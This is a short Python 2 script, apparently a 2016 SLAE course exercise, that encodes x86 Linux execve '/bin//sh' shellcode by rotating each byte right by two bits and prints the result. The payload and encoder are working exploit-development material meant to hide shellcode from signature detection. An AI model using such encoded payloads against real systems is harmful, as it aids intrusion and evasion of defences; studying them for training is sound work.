#!/usr/bin/env python

#-----------------------------------------------------------------------------
#
# encoder.py
# by Michael Born (@blu3gl0w13)
# Student-ID: SLAE-744
# September 5, 2016
#
#----------------------------------------------------------------------------


# handle our imports

import sys


#-------------------------------------------------------------------
#
# The following Bitwise rotation functions
# have been translated from the following blog
# http://www.falatic.com/index.php/108/python-and-bitwise-rotation
#-------------------------------------------------------------------

def ror(valueToBeRotated, rotateAmount):

  return ((valueToBeRotated & 0xff) >> rotateAmount % 8) | (valueToBeRotated << (8 - (rotateAmount % 8)) & 0xff)



def rol(valueToBeRotated, rotateAmount):

  return ((valueToBeRotated << (rotateAmount % 8)) & 0xff) | ((valueToBeRotated & 0xff) >> (8 - (rotateAmount % 8)))



shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")



encshellcode = ""
encshellcode2 = ""

for i in bytearray(shellcode):

  x = ror(i, 2)
  #x = i >> 2
  encshellcode += "\\x%02x," % x
  encshellcode2 += "0x%02x," % x


print "Encoded Shellcode: %s\n" % encshellcode
print "Encoded Shellcode 2: %s\n\n" % encshellcode2

